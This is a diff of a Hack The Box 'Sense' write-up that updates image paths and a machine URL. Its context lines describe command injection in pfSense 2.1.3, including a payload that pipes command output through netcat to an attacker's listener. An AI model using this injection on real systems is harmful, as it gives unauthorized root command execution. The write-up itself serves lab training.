@@ -8,8 +8,8 @@ classes: wide
 sidebar:
   - title: "Difficulty: Easy"
     image: /images/posts/2020/2020-01-15-sense-writeup/sense.png
-    text: "https://app.hackthebox.eu/machines/Sense"
-typora-copy-images-to: ../images/posts/2020/${filename}/
+    text: "https://app.hackthebox.eu/machines/111"
+typora-copy-images-to: ../../images/posts/2020/${filename}/
 ---
 An interesting box that teaches the value of thorough enumeration.…
 
@@ -43,12 +43,12 @@ On logging in we can see that PFsense is running the 2.1.3 release. Exploitdb li
 
 To test it out we can start up Burp Suite and then set our browser to send traffic through the Burp Suite proxy. If we browse to the affected URL we can capture the request and send it to the Repeater component so we can edit it:
 
-![Screenshot-from-2020-01-14-16-00-02](../images/posts/2020/2020-01-15-sense-writeup/Screenshot-from-2020-01-14-16-00-02.png)
+![Screenshot-from-2020-01-14-16-00-02](../../images/posts/2020/2020-01-15-sense-writeup/Screenshot-from-2020-01-14-16-00-02.png)
 
 From the CVE details we know that you can specify arbitrary shell commands by using a semicolon. We can test this is working, by sending a sleep command:
 
 
-![Screenshot-from-2020-01-14-16-01-19](../images/posts/2020/2020-01-15-sense-writeup/Screenshot-from-2020-01-14-16-01-19.png)
+![Screenshot-from-2020-01-14-16-01-19](../../images/posts/2020/2020-01-15-sense-writeup/Screenshot-from-2020-01-14-16-01-19.png)
 
 If this takes 10+ seconds to return, we have command execution. As this is an HTTP request data needs to be URL Encoded, hence the + instead of a space.
 
@@ -56,7 +56,7 @@ Due to the way the vulnerability works, nothing is outputted to stdout and so wo
 
 If we send `database=queues;whoami|nc+<ip_address>+<port>` with a listener on our machine, we can get the output of the command.
 
-![Screenshot-from-2020-01-14-16-07-39](../images/posts/2020/2020-01-15-sense-writeup/Screenshot-from-2020-01-14-16-07-39.png)
+![Screenshot-from-2020-01-14-16-07-39](../../images/posts/2020/2020-01-15-sense-writeup/Screenshot-from-2020-01-14-16-07-39.png)
 
 So, running as root, that's handy as we won't need to do any privilege escalation.
 
